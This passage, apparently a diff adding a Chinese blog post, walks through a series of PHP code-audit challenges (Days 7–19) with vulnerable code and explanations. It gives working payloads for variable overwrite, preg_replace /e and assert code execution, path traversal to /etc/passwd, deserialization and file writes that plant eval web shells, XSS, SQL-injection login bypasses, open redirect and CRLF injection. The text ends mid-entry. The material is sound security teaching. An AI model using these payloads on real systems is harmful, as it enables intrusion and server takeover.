+    $sql = &quot;SELECT username FROM users WHERE id = ?&quot;;
+    $stmt = $db-&gt;prepare($sql);
+    $stmt-&gt;bind_param(&#39;i&#39;, $id);
+    $stmt-&gt;bind_result($name);
+    $stmt-&gt;execute();
+    $stmt-&gt;fetch();
+    return $name;
+&#125;
+
+$var = parse_url($_SERVER[&#39;HTTP_REFERER&#39;]);
+parse_str($var[&#39;query&#39;]);
+$currentUser = getUser($id);
+echo &#39;&lt;h1&gt;&#39;.htmlspecialchars($currentUser).&#39;&lt;/h1&gt;&#39;;</code></pre>
+<p><strong>漏洞：</strong></p>
+<p><code>parse_str</code>导致了变量覆盖漏洞，通过它可以覆盖掉<code>$config</code>变量，使数据库配置信息可控。</p>
+<blockquote>
+<p><a href="http://php.net/manual/zh/function.parse-str.php" target="_blank" rel="noopener"><strong>parse_str</strong></a></p>
+<p><strong>功能</strong> ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。</p>
+<p><strong>定义</strong> ：<code>void parse_str( string $encoded_string [, array &amp;$result ] )</code></p>
+<p>如果 <strong>encoded_string</strong> 是 URL 传入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。</p>
+</blockquote>
+<p>Payload:</p>
+<pre><code>http://host/?config[dbhost]=10.0.0.5&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=test&amp;id=1</code></pre>
+<h2 id="Day-8-Candle"><a href="#Day-8-Candle" class="headerlink" title="Day 8 - Candle"></a>Day 8 - Candle</h2><p><strong>code:</strong></p>
+<pre><code class="php">header(&quot;Content-Type: text/plain&quot;);
+
+function complexStrtolower($regex, $value) &#123;
+    return preg_replace(
+        &#39;/(&#39; . $regex . &#39;)/ei&#39;,
+        &#39;strtolower(&quot;\\1&quot;)&#39;,
+        $value
+    );
+&#125;
+
+foreach ($_GET as $regex =&gt; $value) &#123;
+    echo complexStrtolower($regex, $value) . &quot;\n&quot;;
+&#125;</code></pre>
+<p><strong>漏洞：</strong></p>
+<blockquote>
+<p><a href="http://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener"><strong>preg_replace</strong></a>：(PHP 5.5)</p>
+<p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p>
+<p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p>
+<p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功以 <strong>replacement</strong> 进行替换</p>
+</blockquote>
+<p>导致问题出在<code>/e</code>上，/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码执行（在适当的逆向引用替换完之后）。第二个参数即用来替换的参数是<code>strtolower(&quot;\\1&quot;)</code>，<code>strtolower</code>是转换小写字母的函数，<code>\\1</code>表示正则匹配到的第一个内容，这是正则表达式反向引用的知识。</p>
+<blockquote>
+<p><strong>反向引用</strong></p>
+<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
+</blockquote>
+<p>现在可用的参数有<code>preg_replace</code>的第一、三参数，那么我们就可以控制replacement参数来执行php代码。</p>
+<p>正则参数使用<code>.*</code>来匹配任何字符是最方便的选择，但是这里通过GET传入后发现没有匹配到任何字符，因为我们传上去的<code>.*</code> 变成了 <code>_*</code>，这是由于在PHP中，对于传入的非法的 <strong>$_GET</strong> 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。那么可以换用<code>\S*</code>来达到相同的效果。（\S：用于匹配除单个空格符之外的所有字符）</p>
+<p>再就是要执行的PHP代码，要匹配到 <strong>{${phpinfo()}}**才能执行 **phpinfo</strong> 函数。这实际上是 <a href="http://php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">PHP可变变量</a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。</p>
+<p>Payload1:<code>/?.*=&#123;$&#123;phpinfo()&#125;&#125;</code>，利用了反向引用，在直接写进代码时可成功执行，但由于特殊符号<code>.</code>通过GET方法传入时会被替换为<code>_</code>，从而导致无法成功匹配。</p>
+<p>所以最后payload为：<code>\S*=&#123;$&#123;phpinfo()&#125;&#125; </code></p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">https://xz.aliyun.com/t/2557</a></p>
+</blockquote>
+<h2 id="Day-9-Rabbit"><a href="#Day-9-Rabbit" class="headerlink" title="Day 9 - Rabbit"></a>Day 9 - Rabbit</h2><p><strong>code:</strong></p>
+<pre><code class="php">class LanguageManager
+&#123;
+    public function loadLanguage()
+    &#123;
+        $lang = $this-&gt;getBrowserLanguage();
+        $sanitizedLang = $this-&gt;sanitizeLanguage($lang);
+        require_once(&quot;/lang/$sanitizedLang&quot;);
+    &#125;
+
+    private function getBrowserLanguage()
+    &#123;
+        $lang = $_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;] ?? &#39;en&#39;;
+        return $lang;
+    &#125;
+
+    private function sanitizeLanguage($language)
+    &#123;
+        return str_replace(&#39;../&#39;, &#39;&#39;, $language);
+    &#125;
+&#125;
+
+(new LanguageManager())-&gt;loadLanguage();</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>存在任意文件包含漏洞，问题出在<code>str_replace(&#39;../&#39;, &#39;&#39;, $language)</code>，问题就是这个包含只是单次替换而不是循环替换，所以这种替换就很容易被绕过。只需要叠写一下就好了，如<code>...//</code>。而且<code>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]</code>这个变量是客户端可控的。</p>
+<p>payload：</p>
+<pre><code>Accept-Language:  .//....//....//etc/passwd</code></pre>
+<h2 id="Day-10-Anticipation"><a href="#Day-10-Anticipation" class="headerlink" title="Day 10 - Anticipation"></a>Day 10 - Anticipation</h2><p><strong>code:</strong></p>
+<pre><code class="php">extract($_POST);
+
+function goAway() &#123;
+    error_log(&quot;Hacking attempt.&quot;);
+    header(&#39;Location: /error/&#39;);
+&#125;
+
+if (!isset($pi) || !is_numeric($pi)) &#123;
+    goAway();
+&#125;
+
+if (!assert(&quot;(int)$pi == 3&quot;)) &#123;
+    echo &quot;This is not pi.&quot;;
+&#125; else &#123;
+    echo &quot;This might be pi.&quot;;
+&#125;</code></pre>
+<p><strong>漏洞：</strong></p>
+<blockquote>
+<ol>
+<li>使用header()进行跳转的时候没有使用<code>exit()</code>或者是<code>die()</code>，导致后续的代码任然可以执行。</li>
+<li><code>assert()</code>能够执行<code>&quot;</code>中的代码,如<code>assert(&quot;(int)phpinfo()&quot;);</code></li>
+</ol>
+</blockquote>
+<p>这道题目实际上讲的是当检测到攻击时，虽然有相应的防御操作，但是程序未立即停止退出，导致程序继续执行的问题。程序在 <strong>第一行处</strong> 使用 <strong>extract</strong> 函数，将 <strong>POST</strong> 请求的数据全都注册成变量。程序对 <strong>pi</strong> 变量进行简单的验证，如果不是数字或者没有设置 <strong>pi</strong> 变量，程序就会执行 <strong>goAway</strong> 方法，即记录错误信息并直接重定向到 <strong>/error/</strong> 页面。但是关键在于，程序在处理完之后，没有立即退出，这样程序又会按照流程执行下去，也就到了 <strong>第11行</strong> 的 <strong>assert</strong> 语句。由于前面 <strong>pi</strong> 变量可以被用户控制，所以在这一行存在远程代码执行漏洞。</p>
+<p>例如我们的payload为：<strong>pi=phpinfo()</strong> ，然后程序就会执行这个 <strong>phpinfo</strong> 函数。用 <strong>BurpSuite</strong> ，可以清晰的看到程序执行了 <strong>phpinfo</strong> 函数。</p>
+<h2 id="Day-11-Pumpkin-Pie"><a href="#Day-11-Pumpkin-Pie" class="headerlink" title="Day 11 - Pumpkin Pie"></a>Day 11 - Pumpkin Pie</h2><p><strong>code:</strong></p>
+<pre><code class="php">class Template &#123;
+    public $cacheFile = &#39;/tmp/cachefile&#39;;
+    public $template = &#39;&lt;div&gt;Welcome back %s&lt;/div&gt;&#39;;
+
+    public function __construct($data = null) &#123;
+        $data = $this-&gt;loadData($data);
+        $this-&gt;render($data);
+    &#125;
+
+    public function loadData($data) &#123;
+        if (substr($data, 0, 2) !== &#39;O:&#39; 
+        &amp;&amp; !preg_match(&#39;/O:\d:/&#39;, $data)) &#123;
+            return unserialize($data);
+        &#125;
+        return [];
+    &#125;
+
+    public function createCache($file = null, $tpl = null) &#123;
+        $file = $file ?? $this-&gt;cacheFile;
+        $tpl = $tpl ?? $this-&gt;template;
+        file_put_contents($file, $tpl);
+    &#125;
+
+    public function render($data) &#123;
+        echo sprintf(
+            $this-&gt;template,
+            htmlspecialchars($data[&#39;name&#39;])
+        );
+    &#125;
+
+    public function __destruct() &#123;
+        $this-&gt;createCache();
+    &#125;
+&#125;
+
+new Template($_COOKIE[&#39;data&#39;]);</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>代码中的<code>??</code>是php7中新的语法糖。<code>??</code>的含义是</p>
+<blockquote>
+<p>由于日常使用中存在大量同时使用三元表达式和 isset()的情况， 我们添加了null合并运算符 (??) 这个语法糖。如果变量存在且值不为NULL， 它就会返回自身的值，否则返回它的第二个操作数。</p>
+</blockquote>
+<p>这道题目使用了<code>unserialize()</code>和<code>__destruct</code>，是考察反序列化漏洞的典型套路。题目的本意很简单，将页面上的内容<code>Welcome back %s</code>最后输出到<code>/tmp/cachefile</code>文件中。而题目最大的问题是需要绕过：</p>
+<ol>
+<li><code>substr($data, 0, 2) !== &#39;O:&#39;</code></li>
+<li><code>preg_match(&#39;/O:\d:/&#39;, $data)</code></li>
+</ol>
+<p>第一个通过数组的方式就可以绕过，而第二个的绕过则需要利用到PHP中的反序列化的一个BUG，只需要在对象长度前添加一个+号，即o:14-&gt;o:+14，这样就可以绕过正则匹配。关于这个BUG的具体分析，可以参见<a href="http://www.phpbug.cn/archives/32.html" target="_blank" rel="noopener">php反序列unserialize的一个小特性</a>。</p>
+<p>接下来就是构造payload了：</p>
+<pre><code class="php">class Template &#123;
+    public $cacheFile = &#39;/var/www/html/shell.php&#39;;
+    public $template = &#39;&lt;?php eval($_POST[xx]);?&gt;&#39;;
+&#125;
+$mytemp = new Template();
+$myarray = array($mytemp);
+$myarray = serialize($myarray);
+var_dump($myarray);</code></pre>
+<pre><code>string(124) &quot;a:1:&#123;i:0;O:8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:23:&quot;/var/www/html/shell.php&quot;;s:8:&quot;template&quot;;s:25:&quot;&lt;?php eval($_POST[xx]);?&gt;&quot;;&#125;&#125;&quot;</code></pre>
+<p>由于需要绕过<code>preg_match(&#39;/O:\d:/&#39;, $data)</code>，需要将<code>O:8</code>变为<code>O:+8</code>,则最后的payload为：</p>
+<pre><code class="php">a:1:&#123;i:0;O:+8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:23:&quot;/var/www/html/shell.php&quot;;s:8:&quot;template&quot;;s:25:&quot;&lt;?php eval($_POST[xx]);?&gt;&quot;;&#125;&#125;</code></pre>
+<h2 id="Day-12-String-Lights"><a href="#Day-12-String-Lights" class="headerlink" title="Day 12 - String Lights"></a>Day 12 - String Lights</h2><p><strong>code:</strong></p>
+<pre><code class="php">$sanitized = [];
+
+foreach ($_GET as $key =&gt; $value) &#123;
+    $sanitized[$key] = intval($value);
+&#125;
+
+$queryParts = array_map(function ($key, $value) &#123;
+    return $key . &#39;=&#39; . $value;
+&#125;, array_keys($sanitized), array_values($sanitized));
+
+$query = implode(&#39;&amp;&#39;, $queryParts);
+
+echo &quot;&lt;a href=&#39;/images/size.php?&quot; .
+    htmlentities($query) . &quot;&#39;&gt;link&lt;/a&gt;&quot;;</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>本题目的关键是在于<code>$sanitized[$key] = intval($value);</code>，同时漏洞也是出自于<code>$sanitized[$key] = intval($value);</code>。这行代码主要就是的作用就是传入的<code>$value</code>进行过滤变为<code>intval($value)</code>，之后再次经过<code>htmlentities</code>进行过滤拼接到<code>&lt;a&gt;</code>标签中作为<code>/images/size.php</code>的参数。</p>
+<p>上述代码的问题在于：</p>
+<ol>
+<li><code>$sanitized[$key] = intval($value)</code>只过滤了value，没有对key进行过滤；</li>
+<li><code>htmlentities</code>默认情况下不会对单引号进行转义。</li>
+</ol>
+<p>那么我们的XSS攻击就可以通过在标签<code>&lt;a&gt;</code>中增加一个<code>onclick</code>的点击事件触发。最后的payload如下<code>/?a&#39;onclick%3dalert(1)%2f%2f=c</code></p>
+<h2 id="Day-13-Turkey-Baster"><a href="#Day-13-Turkey-Baster" class="headerlink" title="Day 13 - Turkey Baster"></a>Day 13 - Turkey Baster</h2><p><strong>code:</strong></p>
+<pre><code class="php">class LoginManager &#123;
+    private $em;
+    private $user;
+    private $password;
+
+    public function __construct($user, $password) &#123;
+        $this-&gt;em = DoctrineManager::getEntityManager();
+        $this-&gt;user = $user;
+        $this-&gt;password = $password;
+    &#125;
+
+    public function isValid() &#123;
+        $user = $this-&gt;sanitizeInput($this-&gt;user);
+        $pass = $this-&gt;sanitizeInput($this-&gt;password);
+
+        $queryBuilder = $this-&gt;em-&gt;createQueryBuilder()
+            -&gt;select(&quot;COUNT(p)&quot;)
+            -&gt;from(&quot;User&quot;, &quot;u&quot;)
+            -&gt;where(&quot;user = &#39;$user&#39; AND password = &#39;$pass&#39;&quot;);
+        $query = $queryBuilder-&gt;getQuery();
+        return boolval($query-&gt;getSingleScalarResult());
+    &#125;
+
+    public function sanitizeInput($input, $length = 20) &#123;
+        $input = addslashes($input);
+        if (strlen($input) &gt; $length) &#123;
+            $input = substr($input, 0, $length);
+        &#125;
+        return $input;
+    &#125;
+&#125;
+
+$auth = new LoginManager($_POST[&#39;user&#39;], $_POST[&#39;passwd&#39;]);
+if (!$auth-&gt;isValid()) &#123;
+    exit;
+&#125;</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>这是段登录认证代码，通过POST传入user和passwd参数，然后通过<code>isValid</code>函数验证合法性。在该函数内，user和password变量都会经过<code>sanitizeInput</code>函数处理后再带入sql语句执行。</p>
+<p>看一下<code>sanitizeInput</code>是怎么处理的，先使用<code>addslashes</code>处理，然后限制长度，超过20就截取前20字符。</p>
+<blockquote>
+<p><a href="http://php.net/manual/zh/function.addslashes.php" target="_blank" rel="noopener">addslashes</a> — 使用反斜线引用字符串</p>
+<pre><code>string addslashes ( string $str )</code></pre>
+<p>作用：在单引号（’）、双引号（”）、反斜线（\）与 NUL（ <strong>NULL</strong> 字符）字符之前加上反斜线。</p>
+</blockquote>
+<p>按说把引号都转义了就不用引发注入了，但是利用substr函数，在<code>\</code>和<code>&#39;</code>之间截取，利用\转义sql语句中原本用来包裹<code>$user</code>的后单引号，起到如下效果：</p>
+<pre><code class="php">select count(p) from user u where user = &#39;1234567890123456789\&#39; AND password = &#39;$pass&#39;</code></pre>
+<p>然后让user=<code>or 1=1#</code>，sql语句就变成了：</p>
+<pre><code class="php">select count(p) from user where user = &#39;1234567890123456789\&#39; AND password = &#39;or 1=1#&#39;</code></pre>
+<p>此我们可以保证带入数据库执行的结果为 <strong>True</strong> ，然后就能够顺利地通过验证。</p>
+<h2 id="Day-14-Snowman"><a href="#Day-14-Snowman" class="headerlink" title="Day 14 - Snowman"></a>Day 14 - Snowman</h2><p><strong>code:</strong></p>
+<pre><code class="php">class Carrot &#123;
+    const EXTERNAL_DIRECTORY = &#39;/tmp/&#39;;
+    private $id;
+    private $lost = 0;
+    private $bought = 0;
+
+    public function __construct($input) &#123;
+        $this-&gt;id = rand(1, 1000);
+
+        foreach ($input as $field =&gt; $count) &#123;
+            $this-&gt;$field = $count++;
+        &#125;
+    &#125;
+
+    public function __destruct() &#123;
+        file_put_contents(
+            self::EXTERNAL_DIRECTORY . $this-&gt;id,
+            var_export(get_object_vars($this), true)
+        );
+    &#125;
+&#125;
+
+$carrot = new Carrot($_GET);</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>任意文件写，可以导致getshell。这里<code>$this-&gt;$field = $count++;</code>，由于、<code>a++</code>和<code>++a</code>的差别，这里<code>$field</code>仍是<code>$count</code>的值，同时<code>$this-&gt;$field</code>可以修改类的任何属性造成了变量覆盖。例如：<code>id=../../../../var/www/html/shell.php</code>。就控制了写文件的路径。</p>
+<p>再就是写入文件的内容，<code>var_export(get_object_vars($this), true)</code>，作用是将类中各属性转换成数组然后再转成字符串形式。</p>
+<blockquote>
+<p>get_object_vars — 返回由对象属性组成的关联数组</p>
+<p>var_export — 输出或返回一个变量的字符串表示</p>
+</blockquote>
+<p>这样一来，全部的属性都会输出，而且这个过程没有转义，我们就可以构造新的属性进行写入。</p>
+<p>通过闭合数组或者将shell内容用<code>&quot;</code>包裹起来达到目的。</p>
+<pre><code class="php">payload1:
+shell=&quot;&lt;?php eval($_POST[xx]); ?&gt;&quot;
+string(131) &quot;array (
+  &#39;id&#39; =&gt; &#39;../../../var/www/html/shell.php&#39;,
+  &#39;lost&#39; =&gt; 0,
+  &#39;bought&#39; =&gt; 0,
+  &#39;shell&#39; =&gt; &#39;&quot;&lt;?php eval($_POST[xx]); ?&gt;&quot;&#39;,
+)&quot;
+
+payload2:
+shell=&#39;,),&lt;?php phpinfo(); ?&gt;//
+string(129) &quot;array (
+  &#39;id&#39; =&gt; &#39;../../../var/www/html/shell.php&#39;,
+  &#39;lost&#39; =&gt; 0,
+  &#39;bought&#39; =&gt; 0,
+  &#39;shell&#39; =&gt; &#39;\&#39;,),&lt;?php phpinfo(); ?&gt;//&#39;,
+)&quot;</code></pre>
+<p>如果按照开发者原本意思进行自增操作，变为<code>++$count</code>也是可以利用的。</p>
+<pre><code class="php">$test = 123; echo ++$test;      // 124
+$test = &#39;123&#39;; echo ++$test;    // 124
+$test = &#39;1ab&#39;; echo ++$test;    // &#39;1ac&#39;
+$test = &#39;ab1&#39;; echo ++$test;    // &#39;ab2&#39;
+$test = &#39;a1b&#39;; echo ++$test;    // &#39;a1c&#39;
+$test =array(2,&#39;name&#39;=&gt;&#39;wyj&#39;); echo ++$test;    //Array123</code></pre>
+<p>通过分析发现，在进行<code>++</code>操作时会进行隐式类型转换，如果能够转换成功，则会进行加法操作；如果不能转换成功，则将最后一个字符进行加法操作。<br>payload变为：</p>
+<pre><code class="php">id=../../var/www/html/test/shell.php4
+or
+id=../../var/www/html/test/shell.pho</code></pre>
+<h2 id="Day-15-Sleigh-Ride"><a href="#Day-15-Sleigh-Ride" class="headerlink" title="Day 15 - Sleigh Ride"></a>Day 15 - Sleigh Ride</h2><p><strong>code:</strong></p>
+<pre><code class="php">class Redirect &#123;
+    private $websiteHost = &#39;www.vulnspy.com&#39;;
+
+    private function setHeaders($url) &#123;
+        $url = urldecode($url);
+        header(&quot;Location: $url&quot;);
+    &#125;
+
+    public function startRedirect($params) &#123;
+        $parts = explode(&#39;/&#39;, $_SERVER[&#39;PHP_SELF&#39;]);
+        $baseFile = end($parts);
+        $url = sprintf(
+            &quot;%s?%s&quot;,
+            $baseFile,
+            http_build_query($params)
+        );
+        $this-&gt;setHeaders($url);
+    &#125;
+&#125;
+
+if ($_GET[&#39;redirect&#39;]) &#123;
+    (new Redirect())-&gt;startRedirect($_GET[&#39;params&#39;]);
+&#125;</code></pre>
+<p>这一关主要考察的是 <code>$_SERVER[&#39;PHP_SELF&#39;]</code> 引发的一个任意网址跳转漏洞</p>
+<p>首先，分析一下程序的运行</p>
+<ul>
+<li>如果有 <code>$_GET[&#39;redirect&#39;]</code> 参数，那么就 New 一个 <code>Redirect</code> 对象，同时调用 <code>Redirect</code> 类的 <code>startRedirect</code> 方法</li>
+<li><code>startRedirect</code> 函数接受一个 <strong>GET</strong> 类型的 <strong>params</strong> 参数，然后在 <code>explode()</code> 函数中，将 <code>$_SERVER[&#39;PHP_SELF&#39;]</code> 得到的值，以 <strong>/</strong> 分割成一个 <code>$parts</code> 数组。</li>
+<li><code>$baseFile</code> 的值为 <strong>$parts</strong> 数组的最后一个值</li>
+<li><strong>$url</strong> 的值为 <code>$baseFile?http_build_query($params)</code> ，其中的 <strong>http_build_query()</strong> 函数就是一个将参数进行URL编码的一个操作，比如 <strong>$params=’test=123’</strong></li>
+<li>然后调用 <strong>setHeaders</strong> 函数，首先解码 <strong>$url</strong> 参数，然后 <strong>header()</strong> 函数直接跳转 <strong>$url</strong></li>
+</ul>
+<p><strong>$_SERVER[‘PHP’]</strong> 存在的问题：</p>
+<p>初看这个程序没什么问题，但是PHP自带的*<em>$_SERVER[‘PHP_SELF’]** 参数是可以控制的。其中 <strong>PHP_SELF</strong> 指当前的页面绝对地址，比如我们的网站：*<em><a href="http://www.test.com/redict/index.php/" target="_blank" rel="noopener">http://www.test.com/redict/index.php\</a></em></em>，那么*<em>PHP_SELF** 就是 <strong>/redict/index.php</strong> 。但有个小问题很多人没有注意到，当<strong>URL</strong>是<strong>PATH_INFO</strong>的时候，比如：*<em><a href="http://www.test.com/redict/index.php/admin/" target="_blank" rel="noopener">http://www.test.com/redict/index.php/admin\</a></em></em>，那么*<em>PHP_SELF*</em>就是**/redict/index.php/admin** 也就是说，其实 <strong>PHP_SELF</strong> 有一部分是我们可以控制的。</p>
+<p>双编码问题：</p>
+<p>URL本来是被浏览器编码过一次，服务器接收到来自浏览器URL请求的时候，会将URL解码一次，由于在程序中我们看到有 <strong>urldecode()</strong> 函数存在，它会再次解码一次URL，此时双编码URL就可以利用，用于绕过某些关键词检测。比如将 <strong>/</strong> 编码为： <strong>%252f</strong></p>
+<p>Payload:</p>
+<pre><code>http://www.test.com/index.php/http:%252f%252flanvnal.com?redirect=test&amp;params=test123 </code></pre>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/3057" target="_blank" rel="noopener">https://xz.aliyun.com/t/3057</a></p>
+</blockquote>
+<h2 id="Day-16-Poem"><a href="#Day-16-Poem" class="headerlink" title="Day 16 - Poem"></a>Day 16 - Poem</h2><p><strong>code:</strong></p>
+<pre><code class="php">class FTP &#123;
+    public $sock;
+
+    public function __construct($host, $port, $user, $pass) &#123;
+        $this-&gt;sock = fsockopen($host, $port);
+
+        $this-&gt;login($user, $pass);
+        $this-&gt;cleanInput();
+        $this-&gt;mode($_REQUEST[&#39;mode&#39;]);
+        $this-&gt;send($_FILES[&#39;file&#39;]);
+    &#125;
+
+    private function cleanInput() &#123;
+        array_filter($_GET, &#39;intval&#39;);
+        array_filter($_POST, &#39;intval&#39;);
+        array_filter($_COOKIE, &#39;intval&#39;);
+    &#125;
+
+    public function login($username, $password) &#123;
+        fwrite($this-&gt;sock, &quot;USER &quot; . $username);
+        fwrite($this-&gt;sock, &quot;PASS &quot; . $password);
+    &#125;
+
+    public function mode($mode) &#123;
+        if ($mode == 1 || $mode == 2 || $mode == 3) &#123;
+            fputs($this-&gt;sock, &quot;MODE $mode&quot;);
+        &#125;
+    &#125;
+
+    public function send($data) &#123;
+        fputs($this-&gt;sock, $data);
+    &#125;
+&#125;
+
+new FTP(&#39;localhost&#39;, 21, &#39;user&#39;, &#39;password&#39;);</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>虽然使用了<code>cleanInput</code>函数过滤了<code>$GET,$POST,$COOKIE</code>，将他们强制转成整型数据。但是后面却传入了一个从 REQUEST方式获取的 mode变量。</p>
+<blockquote>
+<p>超全局数组 <strong>$_REQUEST</strong> 中的数据，是 <strong>$_GET</strong> 、 <strong>$_POST</strong> 、 <strong>$_COOKIE</strong> 的合集，而且数据是复制过去的，并不是引用。</p>
+</blockquote>
+<p>所以 REQUEST 数据丝毫不受过滤函数的影响，最后过滤没起到任何作用。而且第21行比较使用的<code>==</code>弱比较，使用payload：<code>**?mode=1%0a%0dDELETE%20test.php** </code></p>
+<h2 id="Day-17-Mistletoe"><a href="#Day-17-Mistletoe" class="headerlink" title="Day 17 - Mistletoe"></a>Day 17 - Mistletoe</h2><p><strong>code:</strong></p>
+<pre><code class="php">class RealSecureLoginManager &#123;
+    private $em;
+    private $user;
+    private $password;
+
+    public function __construct($user, $password) &#123;
+        $this-&gt;em = DoctrineManager::getEntityManager();
+        $this-&gt;user = $user;
+        $this-&gt;password = $password;
+    &#125;
+
+    public function isValid() &#123;
+        $pass = md5($this-&gt;password, true);
+        $user = $this-&gt;sanitizeInput($this-&gt;user);
+
+        $queryBuilder = $this-&gt;em-&gt;createQueryBuilder()
+            -&gt;select(&quot;COUNT(p)&quot;)
+            -&gt;from(&quot;User&quot;, &quot;u&quot;)
+            -&gt;where(&quot;password = &#39;$pass&#39; AND user = &#39;$user&#39;&quot;);
+        $query = $queryBuilder-&gt;getQuery();
+        return boolval($query-&gt;getSingleScalarResult());
+    &#125;
+
+    public function sanitizeInput($input) &#123;
+        return addslashes($input);
+    &#125;
+&#125;
+
+$auth = new RealSecureLoginManager(
+    $_POST[&#39;user&#39;],
+    $_POST[&#39;passwd&#39;]
+);
+if (!$auth-&gt;isValid()) &#123;
+    exit;
+&#125;</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>这道题目是第13题的升级版本，我们知道在13题中主要是利用了<code>addslashes</code>和字符串截断的方式所造成的<code>\</code>逃逸从而形成的注入。本题最终的目的还是形成SQL注入从而进行任意账户登录。本题的关键问题是在于<code>md5($this-&gt;password, true);</code></p>
+<blockquote>
+<p>md5 — 计算字符串的 MD5 散列值</p>
+<p>string md5 ( string <code>$str</code> [, bool <code>$raw_output</code> = false ] )</p>
+<p>raw_output</p>
+<p>如果可选的 <code>raw_output</code> 被设置为 **<code>TRUE</code>**，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</p>
+</blockquote>
+<p>eg:</p>
+<pre><code class="php">php &gt; var_dump(md5(&#39;1&#39;));
+string(32) &quot;c4ca4238a0b923820dcc509a6f75849b&quot;
+php &gt; var_dump(md5(&#39;1&#39;,true));
+�P�ou��&quot;6) &quot;��B8��#�</code></pre>
+<p>如果我们能够保证最后经过<code>md5($this-&gt;password, true);</code>最后的字符串是<code>\</code>，那么就和Day13一样的效果，能绕过登录验证，通过fuzz，我们发现<code>md5(128,true)</code>得到的是<code>v�an���l���q��\</code>。</p>
+<p>payload为<code>passwd=128&amp;user=&#39; or 1=1#</code></p>
+<h2 id="Day-18-Sign"><a href="#Day-18-Sign" class="headerlink" title="Day 18 - Sign"></a>Day 18 - Sign</h2><p><strong>code：</strong></p>
+<pre><code class="php">class JWT &#123;
+    public function verifyToken($data, $signature) &#123;
+        $pub = openssl_pkey_get_public(&quot;file://pub_key.pem&quot;);
+        $signature = base64_decode($signature);
+        if (openssl_verify($data, $signature, $pub)) &#123;
+            $object = json_decode(base64_decode($data));
+            $this-&gt;loginAsUser($object);
+        &#125;
+    &#125;
+&#125;
+
+(new JWT())-&gt;verifyToken($_GET[&#39;d&#39;], $_GET[&#39;s&#39;]);</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>问题出在<code>openssl_verify</code>的错误使用。</p>
+<blockquote>
+<p>int openssl_verify ( string <code>$data</code> , string <code>$signature</code> , <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$pub_key_id</code> [, <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$signature_alg</code> = OPENSSL_ALGO_SHA1 ] )</p>
+<p><strong>openssl_verify()</strong> verifies that the <code>signature</code> is correct for the specified <code>data</code> using the public key associated with <code>pub_key_id</code>. This must be the public key corresponding to the private key used for signing.</p>
+<p><strong>返回值</strong></p>
+<p>Returns 1 if the signature is correct, 0 if it is incorrect, and -1 on error.</p>
+</blockquote>
+<p>错误的情况返回<code>-1</code>，这样的话就通过if判断了，因为if只在遇到<code>0</code>或者是<code>false</code>返回的才是<code>false</code>，那么只要让他出错就能绕过验证。如果让<code>openssl_verify()</code>出错呢？我们使用一个其他的<code>pub_key.pem</code>来生成<code>data</code>和<code>signature</code>,这样就可以使得<code>openssl_verify()</code>返回-1。</p>
+<h2 id="Day-19-Birch"><a href="#Day-19-Birch" class="headerlink" title="Day 19 - Birch"></a>Day 19 - Birch</h2><p><strong>code：</strong></p>
+<pre><code class="php">class ImageViewer &#123;
+    private $file;
+
+    function __construct($file) &#123;
+        $this-&gt;file = &quot;images/$file&quot;;
+        $this-&gt;createThumbnail();
+    &#125;
+
+    function createThumbnail() &#123;
+        $e = stripcslashes(
+            preg_replace(
+                &#39;/[^0-9\\\]/&#39;,
+                &#39;&#39;,
+                isset($_GET[&#39;size&#39;]) ? $_GET[&#39;size&#39;] : &#39;25&#39;
+            )
+        );
+        system(&quot;/usr/bin/convert &#123;$this-&gt;file&#125; --resize $e
+                ./thumbs/&#123;$this-&gt;file&#125;&quot;);
+    &#125;
+
+    function __toString() &#123;
+        return &quot;&lt;a href=&#123;$this-&gt;file&#125;&gt;
+                &lt;img src=./thumbs/&#123;$this-&gt;file&#125;&gt;&lt;/a&gt;&quot;;
+    &#125;
+&#125;
+
+echo (new ImageViewer(&quot;image.png&quot;));</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>问题出在<code>stripcslashes</code>函数，看一下PHP手册中的介绍。</p>
+<blockquote>
+<p><strong>stripcslashes</strong></p>
